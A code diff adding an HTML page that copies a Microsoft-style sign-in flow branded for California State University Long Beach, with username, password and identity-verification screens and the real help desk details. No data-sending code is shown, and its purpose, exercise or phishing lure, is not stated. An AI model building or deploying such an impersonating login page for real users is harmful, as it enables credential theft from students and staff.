@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <script  defer src="./app.js"></script>
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+    <title>Sign in to your account</title>
+</head>
+<body>
+    <div class="login-background-img"></div>
+    <div class="sign-in-form">
+        <div id='email-sign-in-form' class ='email-sign-in-form'>
+            <div id='email-screen'class="email-screen">
+                <div class="sign-in-header">
+                    <img id="csulbLogo" src="images/bannerlogo.png" alt="califonia state university long beach">
+                </div>
+                <div class="sign-in-body">
+                    <form class="get-user">
+                        <h1 id="form-title">Sign in</h1> 
+                        <input type="text" id="username" name="username" placeholder="Email, phone, or Skype">
+                        <div class="sign-in-next-btn">
+                            <button id='sign-in-next-btn-submit' class="sign-in-next-btn-submit" onkeyup="displayName()">
+                                Next
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="sign-in-help">
+                For questions or assistance, please contact the <a href="#" class="link">Technology Help Desk</a> at 562-985-4959 or helpdesk@csulb.edu.
+            </div>
+            <div class="sign-in-options">
+                <img id="sign-in-key" src="images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="sign in">
+                <p id="options-text">Sign-in options</p>
+            </div>
+        </div>
+        <div id='loading-screen' class="loading-screen">
+            <div id= 'laoding-screen' class="loading-screen">
+                <div class="sign-in-header">
+                    <img id="microsoftLogo" src="images/microsoftLogo.png" alt="microsoftLogo">
+                </div>
+                <div class="sign-in-body">
+                        <h1 id="form-title">Trying to sign you in</h1> 
+                        <img id="marchingAnts" src="images/marching_ants_white_166de53471265253ab3a456defe6da23.gif" alt="ant">
+                        <div class="cancel-btn">
+                            <button id='sign-in-next-btn-cancel' class="sign-in-next-btn-cancel" >
+                                Cancel
+                            </button>
+                        </div>
+                </div>
+    
+            </div>
+            
+        </div>
+        <div id='password-sign-in-form' class="password-sign-in-form">
+            <div id= 'password-screen' class="password-screen">
+                <div class="sign-in-header">
+                    <img id="csulbLogo" src="images/bannerlogo.png" alt="califonia state university long beach">
+                </div>
+                <div class="sign-in-body">
+                    <form class="get-password">
+                        <div class="arrow-user">
+                            <img id="arrow" src="images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="back arrow">
+                            <div id="display-name"></div>
+                        </div>
+                        <h1  id="form-title">Enter password</h1> 
+                        <input id="username" name="username" placeholder="Password" type="password">
+                        <button id='sign-in-btn-submit' class="sign-in-btn-submit">
+                            Sign in
+                        </button>
+                    </form>
+                </div>
+    
+            </div>
+            <div class="sign-in-help">
+                For questions or assistance, please contact the <a href="#" class="link">Technology Help Desk</a> at 562-985-4959 or helpdesk@csulb.edu.
+            </div>
+    
+        </div>
+        <div id='verification-form' class ='verification-form'>
+            <div id='verification-screen'class="verification-screen">
+                <div class="sign-in-header-verify">
+                    <img id="csulbLogo" src="images/bannerlogo.png" alt="califonia state university long beach">
+                </div>
+                <div id="display-name"></div>
+                <div class="sign-in-body-verify">
+                    <h1 id="form-title-verify">Verify your identity</h1> 
+                    <div class="methods">
+                        <div class="text-method"> 
+                            <img id="message" src="images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" alt="message">
+                            <h6> Text +X XXXXXXXX32</h6>
+                        </div>
+                        <div class="call-method"> 
+                            <img id="phone" src="images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg" alt="phone">
+                            <h6> Call +X XXXXXXXX32</h6>
+                        </div>
+                        <div id="more-info">
+                            <a href="https://support.microsoft.com/en-us/account-billing/common-problems-with-two-step-verification-for-a-work-or-school-account-63acbb9b-16a1-47b9-8619-6a865e8071a5"> More information</a>
+                        </div>
+                        <div id="more-info">
+                            <p>Are your verification methods current? Check at https://aka.ms/mfasetup</p>
+                        </div>
+                        <div id="btn-cancel-div">
+                            <button id="btn-cancel">Cancel</button>
+                        </div>                    
+                         
+                    </div>
+                </div>
+            </div>
+            
+
+            <div class="sign-in-help">
+                For questions or assistance, please contact the <a href="#" class="link">Technology Help Desk</a> at 562-985-4959 or helpdesk@csulb.edu.
+            </div>
+
+        </div>
+
+    </div>
+</body>
+</html>
+</html>
